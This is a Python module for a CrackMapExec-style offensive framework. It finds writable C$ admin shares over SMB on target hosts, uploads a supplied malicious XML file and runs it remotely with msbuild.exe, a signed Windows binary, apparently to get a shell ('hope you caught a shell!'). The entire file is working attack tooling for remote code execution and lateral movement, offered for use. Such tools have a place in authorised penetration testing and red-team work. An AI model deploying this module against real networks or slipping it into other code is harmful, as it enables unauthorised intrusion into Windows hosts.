#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os

class CMXModule:
    '''
    '''
    name = 'msbuild'
    description = 'Launches msbuild on a malicious .xml file'
    supported_protocols = ['smb']
    opsec_safe= True #Does the module touch disk?
    multiple_hosts = True #Does it make sense to run this module on multiple hosts at a time?
    def options(self, context, module_options):
        '''
            FILENAME Name of the .xml file to build
            ARCH Architecture of target system (x86 or x 64)
            VER .NET Version targeted
            TFILE Path for file upload TFILE=

        '''
        self.filename = 'cmx.xml'
        self.arch = ''
        self.ver = 'v4.0.30319'
        if module_options and 'FILENAME' in module_options:
            self.filename = module_options["FILENAME"]
        if module_options and 'ARCH' in module_options:
            self.arch = module_options["ARCH"]

    def on_login(self, context, connection):

        shares = connection.shares()
        for share in shares:
            if 'WRITE' in share['access'] and share['name'] in ['C$']:
                context.log.success('Found writable share: {}'.format(share['name']))

                with open(self.filename, 'rb') as file:
                    try:
                        connection.conn.putFile(share['name'], "\\test.xml", file.read)
                        self.targetFile = share['name'][:-1] + ':\\test.xml'
                        context.log.success('Uploaded file to {}:\\test.xml'.format(share['name']))
                    except Exception as e:
                        context.log.error('Error uploading file {}: {}'.format(share['name'][:-1], e))
            else:
                pass

        winders = "%WINDIR%\\Microsoft.NET\\Framework\\"+ self.ver+ "\\msbuild.exe"
        command = '{} {}'.format(winders, self.targetFile)

        try:
            connection.execute(payload=command, get_output=True)
            context.log.success("Executed msbuild, hope you caught a shell!")

        except Exception as e:
            context.log.error("Msbuild failed")
            context.log.debug("Error : ".format(str(e)))